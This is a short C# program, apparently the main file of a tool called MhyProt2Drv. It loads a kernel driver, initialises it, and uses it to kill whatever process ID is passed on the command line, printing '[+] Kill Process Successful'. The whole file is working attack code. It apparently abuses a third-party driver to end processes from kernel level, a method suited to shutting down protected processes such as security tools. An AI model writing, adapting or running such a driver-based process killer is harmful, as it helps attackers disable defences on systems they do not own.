using MhyProt2Drv.Driver;
using MhyProt2Drv.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace MhyProt2Drv
{
    class Program
    {
        static void Main(string[] args)
        {
            
            DrvLoader loader = new DrvLoader();
            loader.Load();
            MhyProt2 mhyprot = new MhyProt2();
            mhyprot.OpenDrv();
            
            bool res = mhyprot.InitDrv((ulong)Process.GetCurrentProcess().Id);
            if (!res)
            {
                Console.WriteLine("Init Error!");
            }
            else
            {

                mhyprot.KillProcess((uint)int.Parse(args[0]));
                Console.WriteLine($"[+] Kill Process Successful:{args[0]:X}");
            }

            mhyprot.CloseHandle();
            loader.UnLoad();
        }
    }
}
